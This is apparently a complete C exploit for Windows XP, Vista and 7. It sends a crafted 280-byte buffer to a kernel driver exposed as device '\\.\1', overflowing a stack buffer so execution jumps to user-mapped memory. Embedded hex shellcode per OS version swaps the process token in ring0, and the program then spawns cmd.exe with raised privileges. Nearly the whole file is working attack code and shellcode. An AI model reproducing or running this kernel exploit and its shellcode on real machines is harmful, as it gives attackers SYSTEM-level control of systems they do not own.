/*
    @0vercl0k - 0vercl0k.tuxfamily.org :)
*/

#include <windows.h>
#include <winioctl.h>

#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\1"

BYTE escalade_privileges_ring0_winxp[] = "\x89\xe5\x66\x83\xc5\x14\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x44\x89"
"\xc5\x31\xc9\xb1\x88\x66\x01\xc8\x8b\x10\x89\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\x88\x80\xc2\xc8\x8b\x32\x31\xd2\xb2\xc8\x89"
"\x34\x2a\x61\x68\xef\xbe\xad\xde\x50\x53\x31\xc0\x64\x8b\x40\x34\x8b\x40\x10\x31\xdb\x43\xc1\xe3\x10\x66\x81\xc3\xf9\x6d\x01\xd8\x5b\x89\x44\x24\x04\x58\xc3";

BYTE escalade_privileges_ring0_winvista[] = "\x89\xe5\x66\x83\xc5\x14\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x48\x89"
"\xc5\x31\xc9\xb1\xa0\x66\x01\xc8\x8b\x10\x89\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\xa0\x80\xc2\xe0\x8b\x32\x31\xd2\xb2\xe0\x89"
"\x34\x2a\x61\x68\xef\xbe\xad\xde\x50\x53\x31\xc0\x64\x8b\x40\x34\x8b\x40\x10\x31\xdb\x43\xc1\xe3\x12\x66\x81\xc3\x76\x49\x01\xd8\x5b\x89\x44\x24\x04\x58\xc3";

BYTE escalade_privileges_ring0_win7[] = "\x89\xe5\x66\x83\xc5\x14\x60\x66\xbb\x24\x01\x64\x67\x8b\x07\x8b\x40\x50\x89"
"\xc5\x31\xc9\xb1\xb8\x66\x01\xc8\x8b\x10\x89\xd0\x83\x7a\xfc\x04\x74\x02\xeb\xf4\x80\xea\xb8\x80\xc2\xf8\x8b\x32\x31\xd2\xb2\xf8\x89"
"\x34\x2a\x61\x68\xef\xbe\xad\xde\x50\x53\x31\xc0\x64\x8b\x40\x34\x8b\x40\x10\x31\xdb\x43\x43\x43\xc1\xe3\x10\x66\x81\xc3\x93\x75\x01\xd8\x5b\x89\x44\x24\x04\x58\xc3";


typedef enum
{
    WinXp,
    WinVista,
    Win7,
    UnknownVersion
} WINDOWS_OS_VERSION;

WINDOWS_OS_VERSION GetWindowsVersion()
{
    WINDOWS_OS_VERSION v = 0;
    DWORD version = 0, minVersion = 0, majVersion = 0;

    version = GetVersion();

    minVersion = (DWORD)(HIBYTE(LOWORD(version)));
    majVersion = (DWORD)(LOBYTE(LOWORD(version)));

    if(minVersion == 1 && majVersion == 6)
        v = Win7;
    else if(minVersion == 0 && majVersion == 6)
        v = WinVista;
    else if(minVersion == 1 && majVersion == 5)
        v = WinXp;
    else
        v = UnknownVersion;

    return v;
}

VOID SetExecutionOnCore0()
{
    DWORD_PTR mask = 1;

    /* The KdVersionBlock trick only works on the core 0 of your CPU (the others haven't this field filled) */
    SetProcessAffinityMask(
        GetCurrentProcess(),
        mask
    );
}

int main()
{
    STARTUPINFO si = {0};
 	PROCESS_INFORMATION pi = {0};
    DWORD byte = 0, lenMagik = 0, addr = 0;
    HANDLE hDevice = NULL;
    UCHAR magik[1024] = {0};
    PBYTE escalade_privileges_ring0 = NULL;

    SetExecutionOnCore0();

    printf("Allocating memory..\n");
    addr = VirtualAlloc(
        0x01010000,
        0x10000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if(addr == 0)
    {
        printf("Error with VirtualProtect : %.8x", GetLastError());
        return EXIT_FAILURE;
    }

    switch(GetWindowsVersion())
    {
        case WinXp:
            escalade_privileges_ring0 = escalade_privileges_ring0_winxp;
        break;

        case WinVista:
            escalade_privileges_ring0 = escalade_privileges_ring0_winvista;
        break;

        case Win7:
            escalade_privileges_ring0 = escalade_privileges_ring0_win7;
        break;

        case UnknownVersion:
            printf("The Windows version is not recognized, stopping the exploit right now : ( !");
            return EXIT_FAILURE;
        break;
    }

    printf("Copying the ring0 shellcode..\n");
    memcpy(0x01010101, escalade_privileges_ring0, strlen(escalade_privileges_ring0));

    printf("Crafting the input..\n");

    memset(magik, 'A', 276);
    lenMagik += 276;

    /* SEIP = 0x01010101 */
    *((PDWORD)(magik + 276)) = 0x01010101;
    lenMagik += 4;

    printf("- Press to pull the trigger :] -");
    getchar();

    /* On recupère un handle sur le driver */
    hDevice = CreateFile(
        DEVICE_NAME,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if(hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Error with Createfile : %.8x.\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("Sending payload..\n");

    DeviceIoControl(
        hDevice,
        IOCTL_HI,
        magik,
        lenMagik,
        NULL,
        0,
        &byte,
        NULL
    );

    printf("All right, it's time to execute a shell..\n..with more privileges actually !\n");
    CloseHandle(hDevice);

	si.cb = sizeof(si);

	CreateProcess(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

    return EXIT_SUCCESS;
}
